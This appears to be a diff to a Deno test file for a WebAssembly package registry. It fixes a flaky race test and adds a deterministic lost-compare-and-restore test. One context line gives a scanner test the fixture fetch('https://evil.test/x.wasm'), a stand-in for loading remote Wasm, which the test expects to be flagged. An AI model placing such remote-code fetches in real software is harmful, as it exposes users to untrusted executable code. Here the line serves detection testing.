@@ -642,11 +642,27 @@ Deno.test("wasm WAL: racing bundled admissions against shared persistence reject
     authB.admitBundled({ manifest: raw, files: admissionFiles }),
   ]);
 
-  assertEquals(outcomes.filter((o) => o.status === "fulfilled").length, 1, "exactly one install must commit");
-  const rejected = outcomes.filter((o) => o.status === "rejected");
-  assertEquals(rejected.length, 1, "the loser must reject");
-  assert(rejected[0].reason instanceof WasmPackageAuthorityError, "loser must reject with WasmPackageAuthorityError");
-  assertEquals(rejected[0].reason.code, "concurrent_package_write", "loser must fail with concurrent_package_write");
+  // chrome-agent-platform-05epa: both writers admit the SAME manifest, and there are two
+  // LEGAL outcomes with only one commit. If B's _readRegistry lands after A's commit,
+  // admitBundled short-circuits at its digest dedupe
+  //   "if (previous && previous.current.manifestDigest === validated.manifestDigest)
+  //    return { ok: true, deduped: true, record: previous }"
+  // and fulfils with NO CAS, WAL or refusal; if it lands before, B reaches the CAS and
+  // loses with concurrent_package_write. The invariant that always holds is one COMMIT,
+  // not one fulfilled promise - counting fulfilled made this red under load against a
+  // correct product, and no refusal line appeared in the gate log because there was none
+  // to print. The refusal path itself is pinned deterministically by the lost-CAS test
+  // at the end of this file.
+  const settled = outcomes.map((o) => (o.status === "fulfilled"
+    ? { fulfilled: true, result: o.value }
+    : { fulfilled: false, error: o.reason }));
+  const committed = settled.filter((o) => o.fulfilled && o.result?.deduped !== true);
+  assertEquals(committed.length, 1, "exactly one install must COMMIT through the CAS (the other may legitimately dedupe)");
+  for (const o of settled) {
+    if (o.fulfilled) continue;
+    assert(o.error instanceof WasmPackageAuthorityError, "a losing writer must reject with WasmPackageAuthorityError");
+    assertEquals(o.error.code, "concurrent_package_write", "a losing writer must fail with concurrent_package_write");
+  }
 
   // Registry must contain exactly the committed package
   const reg = await authA.query({ packageId: parsed.package.id });
@@ -696,4 +712,31 @@ Deno.test("wasm static/RHC boundary: no route, execution, owner, OPFS, network o
   assert(dynamic.some((row) => row.includes("dynamic WebAssembly")));
   const fetched = await scanShippedJs(["fetch.js"], { readText: async () => 'fetch("https://evil.test/x.wasm")' });
   assert(fetched.some((row) => row.includes("network Wasm")));
+});
+
+
+// chrome-agent-platform-05epa: the racing test above can legally end in a dedupe, so it
+// cannot pin the refusal deterministically. This does: a store that reports one lost
+// compare-and-restore forces the CAS loser with no timing at all, so
+// concurrent_package_write stays covered on a quiet box and a loaded one alike.
+class LostCasStore extends FakeStore {
+  constructor() { super(); this.lostOnce = true; }
+  async compareAndRestore(key, expectedVersion, value) {
+    if (this.lostOnce) { this.lostOnce = false; return false; }
+    return await super.compareAndRestore(key, expectedVersion, value);
+  }
+}
+
+Deno.test("wasm WAL: a lost registry CAS is refused with concurrent_package_write, compensated and cleared, store not poisoned", async () => {
+  const s = await scenario({ store: new LostCasStore() });
+  await expectCode(
+    () => s.authority.admitBundled({ manifest: s.raw, files: s.admissionFiles }),
+    "concurrent_package_write",
+  );
+  const wal = await s.store.getStrict("__wasmTx");
+  assert(wal === null || wal.state === "none", `the loser must not leave a pending transaction, got ${JSON.stringify(wal)}`);
+  const restart = new WasmPackageAuthority({ getStore: () => s.store, inventory: s.inventory });
+  const queried = await restart.query({ packageId: s.object.package.id });
+  assert(queried.ok !== true, "the loser must not have committed a record");
+  assert((await restart.admitBundled({ manifest: s.raw, files: s.admissionFiles })).ok, "the refusal must leave the store usable for a retry");
 });
